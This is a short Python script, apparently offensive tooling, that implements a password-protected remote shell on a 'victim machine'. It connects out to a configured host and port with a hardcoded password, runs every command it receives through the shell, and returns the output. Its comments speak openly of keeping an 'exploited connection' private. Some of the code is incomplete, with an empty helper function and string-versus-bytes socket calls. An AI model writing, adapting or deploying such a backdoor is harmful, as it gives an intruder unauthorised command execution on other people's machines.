#!/usr/bin/python3
"""



"""
# Import libraries:

# Importing subprocess to start a shell
import subprocess

# Import sockets for remote communication
import socket


host = '0.0.0.0'
port = 6666
password = 'testPASS1'


def __bformat__(target_str):
    """

    Takes a literal string and converts it to a byte-string which is returned.

    Args:
        target_str (str): The literal string that you would like converted.

    Returns:
        bytesliteral: The return value; which will be ready to pass directly over a socket.


    """


def Login():
    """

    In an effort to keep your exploited connection from becoming free-for-all for the entire internet it's wise to
    password-protect your access to the victim shell. That's where this function comes in, because moving on with the
    rest of the script won't be possible without the predefined password. Incorrect attempts just lead to the function
    looping/calling itself infinitely.

    Returns:
        None

    """
    global s
    s.send('Login: ')
    pwd = s.recv(1024)

    if pwd.strip() != password:
        Login()
    else:
        s.send('Connected #> ')
        Shell()


# Execute shell commands
def Shell():
    """

    A function that will execute the requested shell-command, pass it to the victim machine as if we're ssh'd/vnc'd in

    Returns:
        None

    """
    while True:
        data = s.recv(1024)

        if data.strip() == '!die':
            break

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()

        s.send(output)
        s.send('#> ')


# Start program
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
Login()
